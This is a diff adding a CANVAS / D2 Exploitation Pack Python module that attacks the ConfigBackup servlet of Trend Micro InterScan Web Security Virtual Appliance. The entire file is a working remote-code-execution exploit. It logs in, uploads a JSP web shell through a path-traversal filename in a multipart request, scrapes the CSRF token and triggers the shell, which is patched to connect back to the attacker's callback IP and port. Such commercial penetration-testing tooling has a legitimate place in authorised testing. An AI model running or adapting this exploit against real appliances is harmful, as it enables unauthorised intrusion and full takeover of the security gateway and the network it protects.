@@ -1,0 +1,148 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+import sys
+import time
+import os
+import random
+import re
+import urllib
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "Trend Micro InterScan Web Security Virtual Appliance ConfigBackup Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote Code Execution in Trend Micro InterScan Web Security Virtual Appliance ConfigBackup servlet"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Trend Micro"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "Trend Micro InterScan Web Security Virtual Appliance  < 6.5 CP 1737"
+DOCUMENTATION["Date public"] = "2017.02.15"
+DOCUMENTATION["References"] = "https://www.korelogic.com/Resources/Advisories/KL-001-2017-001.txt"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+Start converttomosdef to get a MOSDEF node from the JAVA node.
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.filename = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_tmiwsva2/d2.jsp"    
+    self.protocol = "http"
+    self.port = 1812
+    self.username = ""
+    self.password = ""                    
+    self.name = NAME
+    return
+
+  def neededListenerTypes(self):
+    return [canvasengine.JAVASERVER]
+	
+  def upload_file(self):               
+    # Open JSP file
+    f = open(self.filename, "r")
+    fdata = f.read()
+    f.close()
+    
+    fdata = fdata.replace("CALLBACK_IP", self.callback.ip)
+    fdata = fdata.replace("CALLBACK_PORT", str(self.callback.port))    
+    
+    ua = spkproxy.UserAgent("", exploit=self)
+
+    # Authentication
+    url = '/logon.jsp'        
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    data = ua.GET(mainurl)
+
+    url = '/uilogonsubmit.jsp'        
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    params = urllib.urlencode({'wherefrom':'', 'wronglogon':'no', 'pwd':'Log On', 'uid':self.username, 'passwd':self.password})    
+    data = ua.POST(mainurl, params)
+                
+    # Upload JSP file            
+    params = '-----------------880735062871553\r\nContent-Disposition: form-data; name="CSRFGuardToken"\r\n\r\n4POCBRSFC1TYEO2D5IHNLLJAX27BNBLF\r\n-----------------880735062871553\r\nContent-Disposition: form-data; name="op"\r\n\r\nsave\r\n-----------------880735062871553\r\nContent-Disposition: form-data; name="beFullyOrPartially"\r\n\r\n0\r\n-----------------880735062871553\r\nContent-Disposition: form-data; name="uploadfile"; filename="../../../../usr/iwss/AdminUI/tomcat/webapps/ROOT/d2.jsp"\r\nContent-Length: %d\r\n\r\n%s\r\n-----------------880735062871553--\r\n'%(len(fdata), fdata)      
+    url = '/servlet/com.trend.iwss.gui.servlet.ConfigBackup?action=upload_check'        
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    ua.addHeader("Content-Type", "multipart/form-data; boundary=---------------880735062871553") 
+    data = ua.POST(mainurl, params)
+
+    # Get CSRFGuardToken
+    url = '/top.jsp'        
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    data = ua.GET(mainurl, entireresponse=True)
+    m = re.search(b'CSRFGuardToken=([^\"]+)', data)
+    if m is None:
+        self.log("[D2SEC] - Token not found")
+        return 0
+    token = m.group(1)            
+    self.log("[D2SEC] - CSRFGuardToken=%s"%token)
+        	
+    # Execute uploaded JSP file
+    url = "/d2.jsp?CSRFGuardToken=%s"%token
+    mainurl = "%s://%s:%d%s" % (self.protocol, self.host, self.port, url)
+    data = ua.GET(mainurl)    
+                		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.username = self.argsDict.get("username", self.username)
+    self.password = self.argsDict.get("password", self.password)     
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.upload_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
